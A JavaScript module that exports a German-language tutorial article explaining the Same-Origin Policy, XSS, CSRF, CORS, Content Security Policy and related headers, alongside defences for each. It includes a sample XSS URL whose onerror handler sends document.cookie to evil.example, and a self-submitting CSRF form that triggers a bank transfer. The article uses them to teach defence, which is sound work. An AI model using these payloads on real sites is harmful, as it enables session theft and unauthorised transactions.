const e=`---
id: xss-csrf-cors
title: XSS, CSRF, CORS & Content Security Policy
area: security
difficulty: fortgeschritten
minutes: 18
order: 12
summary: Die wichtigsten Browser-Sicherheitsmechanismen und -Angriffe – wie Cross-Site Scripting und Cross-Site Request Forgery funktionieren, was die Same-Origin Policy und CORS wirklich regeln und wie eine CSP schützt.
tags: [XSS, CSRF, CORS, CSP, Same-Origin Policy, Browser-Security]
related: [owasp-top-10, injection, authentifizierung, javascript-dom, https-security-header]
---

## Die Same-Origin Policy

Grundlage der Browser-Sicherheit ist die **[[Same-Origin Policy]]**: Ein Skript darf Antworten nur von seiner eigenen **Origin** lesen. Eine Origin besteht aus Schema, Host und Port:

| URL | gleiche Origin wie \`https://shop.example\` ? |
|---|---|
| \`https://shop.example/konto\` | ✅ ja |
| \`http://shop.example\` | ❌ anderes Schema |
| \`https://api.shop.example\` | ❌ anderer Host |
| \`https://shop.example:8443\` | ❌ anderer Port |

Ohne diese Regel könnte jede besuchte Webseite im Hintergrund dein Webmail oder Online-Banking lesen. Wichtig: Die SOP verhindert das **Lesen** fremder Antworten – nicht unbedingt das **Senden** von Anfragen. Genau darauf baut CSRF auf.

## XSS – Cross-Site Scripting

Bei [[XSS]] schafft es ein Angreifer, **eigenes JavaScript im Kontext deiner Seite** auszuführen. Dieses Skript läuft mit allen Rechten der Seite: Es kann Daten lesen, Aktionen im Namen des Nutzers ausführen, Eingaben mitschneiden oder die Seite verfälschen.

| Variante | Woher kommt der Schadcode? |
|---|---|
| **Stored** | in der Datenbank gespeichert (Kommentar, Profilname) – trifft jeden Besucher |
| **Reflected** | aus der URL, vom Server in die Antwort gespiegelt |
| **DOM-based** | vom Client-Code aus URL/Storage in den DOM geschrieben |

\`\`\`javascript title="❌ DOM-based XSS"
const name = new URLSearchParams(location.search).get('name');
document.querySelector('#gruss').innerHTML = \`Hallo \${name}!\`;
// https://shop.example/?name=<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
\`\`\`

\`\`\`javascript title="✅ Als Text einfügen"
document.querySelector('#gruss').textContent = \`Hallo \${name}!\`;
\`\`\`

### Schutz vor XSS

1. **Kontextgerechtes [[Output Encoding]]:** Daten werden für ihren Zielkontext kodiert (HTML-Body, Attribut, URL, JavaScript). Template-Engines und Frameworks wie React, Vue und Angular escapen in HTML automatisch – **solange du sie nicht umgehst** (\`dangerouslySetInnerHTML\`, \`v-html\`, \`[innerHTML]\`, \`|safe\`).
2. **Wenn HTML nötig ist** (Rich-Text-Editor): mit einer bewährten Bibliothek wie DOMPurify bereinigen.
3. **URLs prüfen:** \`href\`-Werte aus Nutzereingaben nur mit \`https:\`/\`http:\`-Schema zulassen (kein \`javascript:\`).
4. **[[Content Security Policy]]** als zweite Verteidigungslinie.
5. **\`HttpOnly\`-Cookies,** damit Session-Cookies selbst bei XSS nicht ausgelesen werden können.

## CSRF – Cross-Site Request Forgery

Browser senden [[Cookie|Cookies]] automatisch mit jeder passenden Anfrage. Eine bösartige Seite kann deshalb den Browser eines angemeldeten Nutzers dazu bringen, eine Aktion auf einer anderen Seite auszulösen – mit dessen Session:

\`\`\`html title="Auf evil.example – das Opfer ist bei bank.example angemeldet"
<form action="https://bank.example/ueberweisung" method="POST" id="f">
  <input type="hidden" name="an" value="DE00 ANGREIFER">
  <input type="hidden" name="betrag" value="1000">
</form>
<script>document.getElementById('f').submit();<\/script>
\`\`\`

Der Angreifer sieht die Antwort nicht (SOP), aber die Überweisung ist ausgelöst.

### Schutz vor CSRF

- **\`SameSite\`-Cookies:** \`Lax\` (Standard in modernen Browsern) sendet Cookies nicht bei Cross-Site-POSTs; \`Strict\` auch nicht bei Links von außen.
- **CSRF-Tokens:** zufälliger Wert pro Session/Formular, den eine fremde Seite nicht kennen kann. Frameworks wie Django, Rails, Laravel, Spring Security bringen das mit.
- **\`Origin\` / \`Sec-Fetch-Site\`-Header** serverseitig prüfen.
- **Keine Zustandsänderungen per GET.**
- APIs, die nur \`Authorization: Bearer\`-Header akzeptieren (keine Cookies), sind nicht CSRF-anfällig – dafür muss das Token sicher verwahrt werden.

## CORS – kontrollierte Ausnahmen

Manchmal soll eine andere Origin deine API lesen dürfen – etwa das Frontend unter \`https://app.example\` die API unter \`https://api.example\`. **[[CORS]]** (Cross-Origin Resource Sharing) ist der Mechanismus, mit dem der **Server dem Browser erlaubt**, die Antwort für bestimmte Origins freizugeben.

\`\`\`http title="Preflight und Antwort"
OPTIONS /api/bestellungen HTTP/1.1
Origin: https://app.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: content-type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
\`\`\`

\`\`\`javascript title="Express mit dem cors-Paket"
import cors from 'cors';
app.use(cors({ origin: ['https://app.example'], credentials: true }));
\`\`\`

> [!WARNING] CORS ist kein Zugriffsschutz für den Server
> CORS wird **vom Browser** durchgesetzt. \`curl\`, Skripte oder andere Server ignorieren es vollständig. Es lockert die Same-Origin Policy, ersetzt aber keine Authentifizierung und Autorisierung. \`Access-Control-Allow-Origin: *\` zusammen mit Credentials ist verboten – und die Origin des Requests ungeprüft zurückzuspiegeln, ist ein häufiger, gefährlicher Fehler.

> [!TIP] „CORS-Fehler“ in der Konsole
> Ein CORS-Fehler bedeutet: Der **Server** hat die nötigen Header nicht gesendet. Die Lösung liegt fast immer in der Serverkonfiguration (oder einem Dev-Proxy wie in Vite), nicht im Frontend-Code.

## Content Security Policy

Eine **CSP** ist ein HTTP-Header, mit dem du dem Browser sagst, **aus welchen Quellen** Skripte, Styles, Bilder, Frames usw. geladen und ausgeführt werden dürfen. Selbst wenn ein Angreifer HTML einschleust, wird sein Skript nicht ausgeführt.

\`\`\`http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m123';
  style-src 'self';
  img-src 'self' data: https://cdn.example;
  connect-src 'self' https://api.example;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
\`\`\`

- \`'nonce-…'\`: Nur Skripte mit diesem (pro Antwort zufälligen) Nonce-Attribut werden ausgeführt.
- Inline-Event-Handler (\`onclick="…"\`) und \`eval\` sind standardmäßig blockiert – gut so.
- \`frame-ancestors 'none'\` verhindert Clickjacking (Einbetten deiner Seite in fremde Frames).
- Einführung mit \`Content-Security-Policy-Report-Only\`, um Verstöße erst zu beobachten.

## Weitere nützliche Sicherheitsheader

| Header | Wirkung |
|---|---|
| \`Strict-Transport-Security: max-age=31536000; includeSubDomains\` | nur noch HTTPS (HSTS) |
| \`X-Content-Type-Options: nosniff\` | Browser rät keine MIME-Typen |
| \`Referrer-Policy: strict-origin-when-cross-origin\` | weniger Daten im Referer |
| \`Permissions-Policy: camera=(), geolocation=()\` | Browser-Features einschränken |

## Wie geht es weiter?

Wie sichere Logins und Sessions funktionieren, zeigt [Authentifizierung](#/artikel/authentifizierung); die serverseitige Injection-Familie [Injection](#/artikel/injection).
`;export{e as default};
